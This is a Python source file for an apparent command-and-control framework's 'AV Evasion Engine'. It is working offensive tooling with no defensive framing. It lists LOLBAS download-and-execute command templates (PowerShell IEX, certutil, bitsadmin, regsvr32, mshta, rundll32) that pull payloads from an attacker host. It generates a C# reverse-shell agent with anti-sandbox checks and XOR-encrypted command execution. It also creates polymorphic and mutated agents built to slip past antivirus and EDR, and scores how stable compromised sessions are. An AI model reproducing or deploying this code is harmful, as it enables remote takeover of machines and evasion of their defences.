#!/usr/bin/env python3
"""
AV Evasion Engine
Advanced techniques for bypassing antivirus and EDR solutions
"""

import base64
import random
import string
import json
from datetime import datetime
from polymorphic_obfuscator import PolymorphicObfuscator, AgentMutator


class AVEvasionEngine:
    """
    Professional AV/EDR evasion techniques
    """
    
    def __init__(self):
        self.lolbas_techniques = self._initialize_lolbas_techniques()
    
    def _initialize_lolbas_techniques(self):
        """Initialize LOLBAS (Living Off The Land Binaries and Scripts) techniques"""
        return {
            'PowerShell IEX Download': {
                'description': 'Execute PowerShell from remote URL using IEX',
                'binary': 'powershell.exe',
                'detection': 'Low',
                'template': 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://{LHOST}:{LPORT}/payload.ps1\')"'
            },
            'MSBuild Inline': {
                'description': 'Execute inline tasks via MSBuild.exe',
                'binary': 'MSBuild.exe',
                'detection': 'Very Low',
                'template': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe http://{LHOST}:{LPORT}/payload.xml'
            },
            'RegSvr32 SCT': {
                'description': 'Execute scriptlet via RegSvr32',
                'binary': 'regsvr32.exe',
                'detection': 'Low',
                'template': 'regsvr32.exe /s /n /u /i:http://{LHOST}:{LPORT}/payload.sct scrobj.dll'
            },
            'WScript Remote': {
                'description': 'Execute VBScript from remote location',
                'binary': 'wscript.exe',
                'detection': 'Medium',
                'template': 'wscript.exe http://{LHOST}:{LPORT}/payload.vbs'
            },
            'CertUtil Download': {
                'description': 'Download and execute using certutil',
                'binary': 'certutil.exe',
                'detection': 'Low',
                'template': 'certutil.exe -urlcache -split -f http://{LHOST}:{LPORT}/payload.exe C:\\Windows\\Temp\\update.exe && C:\\Windows\\Temp\\update.exe'
            },
            'BITSAdmin Download': {
                'description': 'BITS download and execute',
                'binary': 'bitsadmin.exe',
                'detection': 'Low',
                'template': 'bitsadmin.exe /transfer job /download /priority high http://{LHOST}:{LPORT}/payload.exe C:\\Windows\\Temp\\update.exe && C:\\Windows\\Temp\\update.exe'
            },
            'MSHTA HTML Application': {
                'description': 'Execute HTA file via mshta',
                'binary': 'mshta.exe',
                'detection': 'Medium',
                'template': 'mshta.exe http://{LHOST}:{LPORT}/payload.hta'
            },
            'RunDLL32 JavaScript': {
                'description': 'Execute JavaScript via rundll32',
                'binary': 'rundll32.exe',
                'detection': 'Low',
                'template': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(\'http://{LHOST}:{LPORT}/payload.ps1\')")'
            },
        }
    
    def get_lolbas_techniques(self):
        """Return all available LOLBAS techniques"""
        return self.lolbas_techniques
    
    def generate_lolbas_payload(self, lhost, lport):
        """Generate a random LOLBAS payload"""
        technique_name = random.choice(list(self.lolbas_techniques.keys()))
        return self.generate_specific_lolbas(technique_name, lhost, lport)
    
    def generate_specific_lolbas(self, technique_name, lhost, lport):
        """Generate a specific LOLBAS payload"""
        if technique_name not in self.lolbas_techniques:
            raise ValueError(f"Unknown LOLBAS technique: {technique_name}")
        
        technique = self.lolbas_techniques[technique_name]
        payload = technique['template'].replace('{LHOST}', lhost).replace('{LPORT}', str(lport))
        
        return payload
    
    def generate_compiled_csharp_agent(self, lhost, lport):
        """Generate a C# agent that can be compiled to EXE"""
        
        # Random class and namespace names
        namespace = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=12))
        classname = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=12))
        
        code = f'''using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Security.Cryptography;

namespace {namespace}
{{
    class {classname}
    {{
        private static string lhost = "{lhost}";
        private static int lport = {lport};
        private static byte[] key = Encoding.UTF8.GetBytes("SecureKey2024!!!");

        static void Main(string[] args)
        {{
            // Anti-sandbox: Sleep for random time
            Thread.Sleep(new Random().Next(3000, 8000));
            
            // Anti-sandbox: Check for debugger
            if (Debugger.IsAttached)
                return;
            
            // Connect with retry
            int retries = 0;
            while (retries < 5)
            {{
                try
                {{
                    ConnectAndExecute();
                    break;
                }}
                catch
                {{
                    Thread.Sleep(30000);
                    retries++;
                }}
            }}
        }}

        static void ConnectAndExecute()
        {{
            using (TcpClient client = new TcpClient(lhost, lport))
            using (NetworkStream stream = client.GetStream())
            {{
                byte[] buffer = new byte[8192];
                int bytesRead;

                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
                {{
                    // Decrypt command
                    byte[] encryptedCmd = new byte[bytesRead];
                    Array.Copy(buffer, encryptedCmd, bytesRead);
                    string command = DecryptData(encryptedCmd);

                    if (command.ToLower().Trim() == "exit")
                        break;

                    // Execute command
                    string result = ExecuteCommand(command);
                    
                    // Encrypt response
                    byte[] encryptedResult = EncryptData(result);
                    stream.Write(encryptedResult, 0, encryptedResult.Length);
                }}
            }}
        }}

        static string ExecuteCommand(string command)
        {{
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo()
                {{
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WorkingDirectory = Environment.CurrentDirectory
                }};

                using (Process proc = Process.Start(psi))
                {{
                    string output = proc.StandardOutput.ReadToEnd();
                    string errors = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(30000);
                    return output + errors;
                }}
            }}
            catch (Exception ex)
            {{
                return "Error: " + ex.Message;
            }}
        }}

        static byte[] EncryptData(string data)
        {{
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);
            byte[] result = new byte[dataBytes.Length];
            
            for (int i = 0; i < dataBytes.Length; i++)
            {{
                result[i] = (byte)(dataBytes[i] ^ key[i % key.Length]);
            }}
            
            return result;
        }}

        static string DecryptData(byte[] data)
        {{
            byte[] result = new byte[data.Length];
            
            for (int i = 0; i < data.Length; i++)
            {{
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }}
            
            return Encoding.UTF8.GetString(result);
        }}
    }}
}}
'''
        
        return {
            'code': code,
            'filename': f'{classname}.cs',
            'classname': classname,
            'namespace': namespace,
            'compile_command': f'csc.exe /target:exe /out:{classname}.exe {classname}.cs',
            'compile_command_mono': f'mcs -out:{classname}.exe {classname}.cs'
        }
    
    def generate_polymorphic_agent(self, lhost, lport, agent_type='python', obfuscation_level='high'):
        """
        Generate a polymorphic obfuscated agent
        
        Args:
            lhost: Listener host IP
            lport: Listener port
            agent_type: Type of agent ('python', 'powershell', 'csharp', 'bash')
            obfuscation_level: 'low', 'medium', 'high', 'extreme'
        
        Returns:
            Dict with agent code and metadata
        """
        obfuscator = PolymorphicObfuscator(obfuscation_level=obfuscation_level)
        
        if agent_type.lower() == 'python':
            return obfuscator.obfuscate_python("", lhost, lport)
        elif agent_type.lower() == 'powershell':
            return obfuscator.obfuscate_powershell(lhost, lport)
        elif agent_type.lower() == 'csharp':
            return obfuscator.obfuscate_csharp(lhost, lport)
        elif agent_type.lower() == 'bash':
            return obfuscator.obfuscate_bash(lhost, lport)
        else:
            raise ValueError(f"Unsupported agent type: {agent_type}")
    
    def mutate_existing_agent(self, agent_code, language, mutation_rate=0.5):
        """
        Mutate an existing agent to create a new variant
        
        Args:
            agent_code: Original agent code
            language: Programming language
            mutation_rate: How much to mutate (0.0 to 1.0)
        
        Returns:
            Mutated agent code
        """
        mutator = AgentMutator()
        return mutator.mutate_agent(agent_code, language, mutation_rate)
    
    def detect_agent_type(self, initial_response, connection_behavior):
        """
        Detect agent type based on response patterns
        
        Args:
            initial_response: First response from agent
            connection_behavior: Dict with connection metadata
        
        Returns:
            Dict with agent type, stability, and recommendations
        """
        
        agent_info = {
            'agent_type': 'unknown',
            'stability': 'unknown',
            'encryption': 'none',
            'capabilities': [],
            'recommendation': ''
        }
        
        # Check for c2py advanced agent
        if b'SecureKey2024' in initial_response or self._is_xor_encrypted(initial_response):
            agent_info['agent_type'] = 'c2py_advanced_agent'
            agent_info['stability'] = 'stable'
            agent_info['encryption'] = 'xor'
            agent_info['capabilities'] = ['encrypted_comms', 'json_support', 'file_transfer']
            agent_info['recommendation'] = 'Fully featured c2py agent - all commands supported'
        
        # Check for basic PowerShell
        elif b'PS ' in initial_response or b'Windows PowerShell' in initial_response:
            agent_info['agent_type'] = 'basic_powershell'
            agent_info['stability'] = 'moderate'
            agent_info['encryption'] = 'none'
            agent_info['capabilities'] = ['shell_commands']
            agent_info['recommendation'] = 'Basic shell - use simple commands, avoid advanced features'
        
        # Check for cmd.exe
        elif b'Microsoft Windows' in initial_response or b'C:\\' in initial_response:
            agent_info['agent_type'] = 'basic_cmd'
            agent_info['stability'] = 'moderate'
            agent_info['encryption'] = 'none'
            agent_info['capabilities'] = ['shell_commands']
            agent_info['recommendation'] = 'CMD shell - use Windows commands, avoid PowerShell'
        
        # Check for Unix/Linux shell
        elif b'$' in initial_response or b'#' in initial_response or b'/' in initial_response:
            agent_info['agent_type'] = 'basic_bash'
            agent_info['stability'] = 'moderate'
            agent_info['encryption'] = 'none'
            agent_info['capabilities'] = ['shell_commands']
            agent_info['recommendation'] = 'Unix shell - use standard commands'
        
        # Check for Meterpreter
        elif b'meterpreter' in initial_response.lower():
            agent_info['agent_type'] = 'meterpreter'
            agent_info['stability'] = 'stable'
            agent_info['encryption'] = 'unknown'
            agent_info['capabilities'] = ['advanced_post_exploitation']
            agent_info['recommendation'] = 'Metasploit session - use meterpreter commands'
        
        else:
            agent_info['agent_type'] = 'custom_shell'
            agent_info['stability'] = 'unstable'
            agent_info['encryption'] = 'none'
            agent_info['capabilities'] = ['basic_shell']
            agent_info['recommendation'] = 'Unknown agent - test commands carefully'
        
        return agent_info
    
    def _is_xor_encrypted(self, data):
        """Check if data appears to be XOR encrypted"""
        # XOR encrypted data typically has high entropy
        if len(data) < 10:
            return False
        
        # Check for patterns that suggest encryption
        unique_bytes = len(set(data))
        entropy_ratio = unique_bytes / len(data)
        
        # Encrypted data usually has high byte diversity
        return entropy_ratio > 0.6
    
    def analyze_connection_stability(self, client_data):
        """
        Analyze connection stability and provide recommendations
        
        Args:
            client_data: Dictionary with client connection info
        
        Returns:
            Dict with stability analysis and recommendations
        """
        
        analysis = {
            'stability_score': 0,
            'issues': [],
            'recommendations': [],
            'risk_level': 'unknown'
        }
        
        # Check connection duration
        if 'connected_at' in client_data:
            connection_time = (datetime.now() - client_data['connected_at']).total_seconds()
            if connection_time > 3600:  # More than 1 hour
                analysis['stability_score'] += 30
            elif connection_time > 600:  # More than 10 minutes
                analysis['stability_score'] += 20
            else:
                analysis['stability_score'] += 10
                analysis['issues'].append('Recent connection - stability unknown')
        
        # Check encryption
        if client_data.get('encryption') == 'xor':
            analysis['stability_score'] += 25
        else:
            analysis['issues'].append('No encryption detected')
            analysis['recommendations'].append('Upgrade to c2py advanced agent for encryption')
        
        # Check agent type
        if client_data.get('agent_type') == 'c2py_advanced_agent':
            analysis['stability_score'] += 25
        elif client_data.get('agent_type') in ['basic_powershell', 'basic_cmd', 'basic_bash']:
            analysis['stability_score'] += 15
            analysis['recommendations'].append('Consider upgrading to advanced agent')
        else:
            analysis['stability_score'] += 5
            analysis['issues'].append('Unknown or unstable agent type')
        
        # Check capabilities
        capabilities = client_data.get('capabilities', [])
        if len(capabilities) > 2:
            analysis['stability_score'] += 20
        elif len(capabilities) > 0:
            analysis['stability_score'] += 10
        
        # Determine risk level
        if analysis['stability_score'] >= 70:
            analysis['risk_level'] = 'low'
        elif analysis['stability_score'] >= 40:
            analysis['risk_level'] = 'medium'
        else:
            analysis['risk_level'] = 'high'
            analysis['recommendations'].append('Connection may be unstable - consider re-establishing')
        
        return analysis


if __name__ == "__main__":
    # Test the AV Evasion Engine
    engine = AVEvasionEngine()
    
    print("=== LOLBAS Techniques ===")
    techniques = engine.get_lolbas_techniques()
    for name, info in techniques.items():
        print(f"\n{name}:")
        print(f"  Binary: {info['binary']}")
        print(f"  Detection: {info['detection']}")
        print(f"  Description: {info['description']}")
    
    print("\n=== Sample LOLBAS Payload ===")
    payload = engine.generate_lolbas_payload("192.168.1.100", 8080)
    print(payload)
    
    print("\n=== Compiled C# Agent ===")
    agent = engine.generate_compiled_csharp_agent("192.168.1.100", 4444)
    print(f"Filename: {agent['filename']}")
    print(f"Compile: {agent['compile_command']}")
